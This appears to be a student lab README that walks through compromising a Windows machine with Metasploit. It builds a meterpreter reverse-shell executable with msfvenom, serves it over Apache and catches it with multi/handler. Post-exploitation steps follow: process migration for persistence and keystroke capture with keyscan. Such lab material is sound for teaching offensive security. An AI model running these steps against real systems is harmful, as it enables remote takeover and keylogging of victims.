# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
## PROGRAM:
Find the attackers ip address using ifconfig
## OUTPUT:
![image](https://github.com/MARXINLIJO/Compromising-windows-using-Metasploit/assets/145742540/c5788c06-bf76-470a-b73a-f7e961243721)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT

![image](https://github.com/MARXINLIJO/Compromising-windows-using-Metasploit/assets/145742540/d8de3282-877c-43cd-9201-86b279836d15)
copy the fun.exe into the apache /var/www/html folder

![image](https://github.com/MARXINLIJO/Compromising-windows-using-Metasploit/assets/145742540/765d78c2-7688-42f9-b83e-a26d3953adb4)

Start apache server sudo systemctl apache2 start

![image](https://github.com/MARXINLIJO/Compromising-windows-using-Metasploit/assets/145742540/b8a353bb-25df-4f0c-8e2f-bd8f3be7848e)

Check the status of apache2

![image](https://github.com/MARXINLIJO/Compromising-windows-using-Metasploit/assets/145742540/6ed4c9fe-0d72-4675-99f9-4c73172afa48)

Invoke msfconsole:
![image](https://github.com/MARXINLIJO/Compromising-windows-using-Metasploit/assets/145742540/0ec2a519-5033-407d-8d13-0b86e2ad49d2)

## OUTPUT:

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0

![image](https://github.com/MARXINLIJO/Compromising-windows-using-Metasploit/assets/145742540/fffcba32-6dfc-4dc7-97fc-14bc4551cc93)
exploit
On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.
Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![image](https://github.com/MARXINLIJO/Compromising-windows-using-Metasploit/assets/145742540/60b8627e-5e6a-4050-a50f-4ae1c92dd98f)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156
![image](https://github.com/MARXINLIJO/Compromising-windows-using-Metasploit/assets/145742540/6fd42cbd-3af4-4a9f-9d00-bc3540f8fa53)
The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

![image](https://github.com/MARXINLIJO/Compromising-windows-using-Metasploit/assets/145742540/3295062d-fc87-4918-945e-eb2a205ba895)

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![image](https://github.com/MARXINLIJO/Compromising-windows-using-Metasploit/assets/145742540/59e9137f-68c6-4910-9bfc-849970954b34)


keyscan_dump Shows the keystrokes captured so far

![image](https://github.com/MARXINLIJO/Compromising-windows-using-Metasploit/assets/145742540/666ad419-9876-421b-b9d2-28a10f0189d5)
## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
